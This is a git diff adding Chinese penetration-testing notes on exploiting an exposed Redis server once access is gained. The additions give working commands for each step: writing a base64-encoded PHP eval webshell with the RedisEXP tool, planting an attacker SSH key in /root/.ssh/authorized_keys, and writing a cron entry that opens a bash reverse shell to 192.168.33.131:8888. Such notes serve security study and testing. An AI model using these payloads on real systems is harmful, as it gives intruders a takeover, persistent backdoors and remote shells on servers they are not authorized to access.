@@ -44,6 +44,12 @@ RedisEXP_windows_amd64.exe -m brute -r 192.168.110.179 -p 6379 -f pass.txt
 
 ## 拿到redis权限后如何进一步提权
 
+基本上分为三类：
+
+* 利用redis写数据备份文件实现任意文件写，除了下面三个例子外，还可以写/etc/passwd等（写入时的乱码对我们可能有一些限制）
+* 主从复制
+* cve lua脚本的沙箱逃逸
+
 ### 写webshell
 
 * 条件：
@@ -72,14 +78,72 @@ save
 * 工具
 
 ```shell
-RedisEXP_windows_amd64.exe -m shell -r 192.168.110.177 -p 6379 -w foobared -rp /www/wwwroot/192.168.110.177 -rf shell.php -s IlxuXG5cbjw/cGhwIGVjaG8gZXZhbCgkX0dFVFsnc2hlbGwnXSk7Pz5cblxuXG4i -b
+# -s后是写入的内容的base64，-b是解码选项
+# 这个命令应该是比较通用的，写任意文件，不止写webshell
+RedisEXP_windows_amd64.exe -m shell -r ip -p port -w password -rp /website/path -rf webshellfilename -s XG5cblxuPD9waHAgZWNobyBldmFsKCRfR0VUWydzaGVsbCddKTs/PlxuXG5cbg== -b
 ```
-
-
 
 ### 写ssh-keygen公钥
 
+* 和写webshell一样指定目录写文件的权限
+* 目标开放ssh服务，而且允许使用秘钥登录
+
+我们在攻击机上通过ssh-keygen -t rsa生成我们的证书，下图的id_rsa.pub就是公钥
+
+![image-20241014165628535](./images/image-20241014165628535.png)
+
+.ssh一般在~/.ssh，每个用户都有自己的专属目录，这里我们简单介绍一下.ssh目录下的文件：
+
+* id_rsa，私钥文件，ssh服务端用它相对应的公钥来验证用户是否合法
+* id_rsa，公钥文件
+* known_hosts，存储客户端曾经连接过的ssh服务器主机信息
+* authorized_keys，存放允许连接到服务器的客户端公钥，可以存放多个公钥
+* config，自定义ssh客户端配置
+
+```shell
+# 这一步有时候有权限也不成功，可能是由于该目录不存在
+config set dir /root/.ssh
+config set dbfilename authorized_keys
+# .....替换为ssh证书的公钥
+# 这里有一个坑点，我们需要\n防止乱码的影响，但在redis-cli的交互模式下，\n不会被解析为换行，我们可以通过脚本或者echo "\n"|redis-cli set xxx来实现
+set xxx "\n......\n"
+save
+```
+
+* 工具
+
+```shell
+# 公钥两边的引号不要省略
+RedisEXP_windows_amd64.exe -m ssh -r ip -p port -w password -u user -s "自己的公钥"
+```
+
 ### 写计划任务
+
+* 指定目录写文件的权限
+
+* 系统限制
+
+  * 这里在网上看到一些文章说ubuntu不适用而centos适用，因为
+    * ubuntu的计划任务在/var/spool/cron/crontabs/下，要求权限为600才能正确被执行，而redis写入文件默认为644，centos则没有这个要求
+    * centos的计划任务中可以有乱码，而ubuntu不行
+  * 对于权限问题，ubuntu在/etc/cron.d目录下也可以写，而且没有权限限制
+  * 但是对于乱码问题，Ubuntu对于定时计划有严格的格式要求，这里无法解决。
+
+  ![image-20241014200637081](./images/image-20241014200637081-1728907602573-1.png)
+
+```shell
+#设置保存路径，centos的计划任务路径
+config set dir /var/spool/cron/crontabs/ 
+config set dbfilename shell 
+#反弹shell
+set xz "\n * bash -i >& /dev/tcp/192.168.33.131/8888 0>&1\n" 
+```
+
+* 工具
+
+```shell
+RedisEXP_windows_amd64.exe -m cron -r 目标ip -p 目标端口 -w password -L 反连ip -P 反连端口
+```
 
 ### redis主从复制getshell
 
@@ -88,6 +152,15 @@ RedisEXP_windows_amd64.exe -m shell -r 192.168.110.177 -p 6379 -w foobared -rp /
 #### 本地主从
 
 ### CVE-2022-0543
+
+## 其他用法
+
+* 探测目录
+  * 利用config set dir，前提是有权限，若目录不存在会返回`(error) ERR Changing directory: No such file or directory`
+
+## 工具分析
+
+
 
 ## 实战案例
 
